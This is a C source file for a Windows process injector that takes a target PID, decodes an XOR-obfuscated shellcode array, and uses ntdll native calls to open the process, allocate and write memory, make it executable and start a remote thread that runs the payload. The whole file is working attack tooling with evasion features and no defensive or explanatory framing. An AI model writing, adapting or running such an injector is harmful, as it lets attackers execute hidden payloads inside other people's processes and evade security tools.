#include <stdio.h>
#include <windows.h>
#include "Native.h"

int main(int argc, char** argv)
{
    if (argc < 2) {
        warn("Usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    DWORD       PID         = 0;
    PVOID       rBuffer     = NULL;
    HANDLE      hThread     = NULL;
    HANDLE      hProcess    = NULL;
    HMODULE     hNTDLL      = NULL; // ntdll.dll handle
    ULONG       OldAccessProtection; // for NtProtectVirtualMemory
    
    unsigned char shellCode[] = 
        "\x86\x32\xf9\x9e\x8a\x92\xba\x7a\x7a\x7a\x3b\x2b\x3b\x2a"
        "\x28\x2b\x2c\x32\x4b\xa8\x1f\x32\xf1\x28\x1a\x32\xf1\x28"
        "\x62\x32\xf1\x28\x5a\x32\xf1\x08\x2a\x32\x75\xcd\x30\x30"
        "\x37\x4b\xb3\x32\x4b\xba\xd6\x46\x1b\x06\x78\x56\x5a\x3b"
        "\xbb\xb3\x77\x3b\x7b\xbb\x98\x97\x28\x3b\x2b\x32\xf1\x28"
        "\x5a\xf1\x38\x46\x32\x7b\xaa\xf1\xfa\xf2\x7a\x7a\x7a\x32"
        "\xff\xba\x0e\x1d\x32\x7b\xaa\x2a\xf1\x32\x62\x3e\xf1\x3a"
        "\x5a\x33\x7b\xaa\x99\x2c\x32\x85\xb3\x3b\xf1\x4e\xf2\x32"
        "\x7b\xac\x37\x4b\xb3\x32\x4b\xba\xd6\x3b\xbb\xb3\x77\x3b"
        "\x7b\xbb\x42\x9a\x0f\x8b\x36\x79\x36\x5e\x72\x3f\x43\xab"
        "\x0f\xa2\x22\x3e\xf1\x3a\x5e\x33\x7b\xaa\x1c\x3b\xf1\x76"
        "\x32\x3e\xf1\x3a\x66\x33\x7b\xaa\x3b\xf1\x7e\xf2\x32\x7b"
        "\xaa\x3b\x22\x3b\x22\x24\x23\x20\x3b\x22\x3b\x23\x3b\x20"
        "\x32\xf9\x96\x5a\x3b\x28\x85\x9a\x22\x3b\x23\x20\x32\xf1"
        "\x68\x93\x2d\x85\x85\x85\x27\x33\xc4\x0d\x09\x48\x25\x49"
        "\x48\x7a\x7a\x3b\x2c\x33\xf3\x9c\x32\xfb\x96\xda\x7b\x7a"
        "\x7a\x33\xf3\x9f\x33\xc6\x78\x7a\x6b\x26\xba\xd2\xd1\xfa"
        "\x3b\x2e\x33\xf3\x9e\x36\xf3\x8b\x3b\xc0\x36\x0d\x5c\x7d"
        "\x85\xaf\x36\xf3\x90\x12\x7b\x7b\x7a\x7a\x23\x3b\xc0\x53"
        "\xfa\x11\x7a\x85\xaf\x2a\x2a\x37\x4b\xb3\x37\x4b\xba\x32"
        "\x85\xba\x32\xf3\xb8\x32\x85\xba\x32\xf3\xbb\x3b\xc0\x90"
        "\x75\xa5\x9a\x85\xaf\x32\xf3\xbd\x10\x6a\x3b\x22\x36\xf3"
        "\x98\x32\xf3\x83\x3b\xc0\xe3\xdf\x0e\x1b\x85\xaf\x32\xfb"
        "\xbe\x3a\x78\x7a\x7a\x33\xc2\x19\x17\x1e\x7a\x7a\x7a\x7a"
        "\x7a\x3b\x2a\x3b\x2a\x32\xf3\x98\x2d\x2d\x2d\x37\x4b\xba"
        "\x10\x77\x23\x3b\x2a\x98\x86\x1c\xbd\x3e\x5e\x2e\x7b\x7b"
        "\x32\xf7\x3e\x5e\x62\xbc\x7a\x12\x32\xf3\x9c\x2c\x2a\x3b"
        "\x2a\x3b\x2a\x3b\x2a\x33\x85\xba\x3b\x2a\x33\x85\xb2\x37"
        "\xf3\xbb\x36\xf3\xbb\x3b\xc0\x03\xb6\x45\xfc\x85\xaf\x32"
        "\x4b\xa8\x32\x85\xb0\xf1\x74\x3b\xc0\x72\xfd\x67\x1a\x85"
        "\xaf\xc1\x9a\x67\x50\x70\x3b\xc0\xdc\xef\xc7\xe7\x85\xaf"
        "\x32\xf9\xbe\x52\x46\x7c\x06\x70\xfa\x81\x9a\x0f\x7f\xc1"
        "\x3d\x69\x08\x15\x10\x7a\x23\x3b\xf3\xa0\x85\xaf";
    
    SIZE_T shellCodeSize = sizeof(shellCode);

    //decrypt the payload
    for (int i = 0; i < shellCodeSize; i++)
    {
        shellCode[i] = (byte)(shellCode[i] ^ (byte)'z');
    }

    PID = atoi(argv[1]);

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID = { 0 };
    CID.UniqueProcess = (HANDLE)PID;

    hNTDLL = GetModuleHandle(L"NTDLL");
    if (hNTDLL == NULL) {
        warn("Error getting handle to NTDLL");
        return EXIT_FAILURE;
    }

    info("populating function prototypes");

    NtCreateProcess CustomCreateProcess = (NtCreateProcess)GetProcAddress(hNTDLL, "NtCreateProcess");
    NtOpenProcess CustomOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemory CustomAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory CustomWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    NtProtectVirtualMemory CustomProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
    NtCreateThreadEx CustomCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtClose CustomClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");

    okay("finished populating functions");

    /*-------------------------------------------------INJECTION PART------------------------------------------------------------*/

    info("trying to get handle to PID: %ld", PID);
    STATUS = CustomOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtOpenProcess failed to get a handle, error: 0x%lx", STATUS);
        goto CLEANUP;
    }
    okay("Got a handle %p", hProcess);

    STATUS = CustomAllocateVirtualMemory(hProcess, &rBuffer, NULL, &shellCodeSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtAllocateVirtualMemory failed to allocate memory, error: 0x%lx", STATUS);
        goto CLEANUP;
    }
    okay("Allocated memory for the shellcode, rBuffer=0x%p", rBuffer);

    STATUS = CustomWriteVirtualMemory(hProcess, rBuffer, shellCode, sizeof(shellCode), NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtWriteVirtualMemory failed to write to memory address 0x%p, error: 0x%lx",rBuffer, STATUS);
        goto CLEANUP;
    }

    okay("Copied the shellcode to the buffer space");

    info("Changing memory permission level from RW to RX");
    STATUS = CustomProtectVirtualMemory(hProcess, &rBuffer, &shellCodeSize, PAGE_EXECUTE_READ, &OldAccessProtection);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtProtectVirtualMemory failed to change permission to RX, error: 0x%lx", STATUS);
        goto CLEANUP;
    }

    info("Executing the thread");
    STATUS = CustomCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtOpenProcess failed to get a handle, error: 0x%lx", STATUS);
        goto CLEANUP;
    }
    okay("thread created, started routine! waiting for the thread to finish execution.");
    
    WaitForSingleObject(hThread, INFINITE);
    goto CLEANUP;

CLEANUP:
    if (hProcess) {
        info("closing handle to process");
        CustomClose(hProcess);
    }
    if (hThread) {
        info("closing handle to process");
        CustomClose(hThread);
    }
    okay("Finished.");
    return EXIT_SUCCESS;
}
